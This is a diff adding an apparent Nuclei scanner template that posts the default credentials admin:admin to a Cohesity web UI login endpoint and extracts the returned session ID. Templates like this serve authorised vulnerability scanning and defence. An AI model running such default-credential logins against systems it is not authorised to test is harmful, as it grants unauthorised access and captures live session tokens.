@@ -1,0 +1,45 @@
+id: cohesity-default-login
+
+info:
+  name: Cohesity Web UI - Default Credentials Login
+  author: n0ur5
+  severity: high
+  description: Attempts login to Cohesity web interface using default credentials (admin:admin) and checks for sessionId in the response.
+  tags: cohesity,default-login,login,http
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
+      Accept: application/json, text/plain, */*
+      Referer: "{{BaseURL}}/login"
+      Login-Source: iris_ui
+      Content-Type: application/json;charset=utf-8
+      X-Session-Locale: en-us
+      Origin: "{{BaseURL}}"
+      Dnt: "1"
+      Sec-Gpc: "1"
+      Sec-Fetch-Dest: empty
+      Sec-Fetch-Mode: cors
+      Sec-Fetch-Site: same-origin
+      Priority: u=0
+      Te: trailers
+
+    body: |
+      {"username":"admin","password":"admin","domain":"LOCAL"}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"sessionId":'
+        condition: and
+
+    extractors:
+      - type: json
+        part: body
+        json:
+          - ".sessionId"
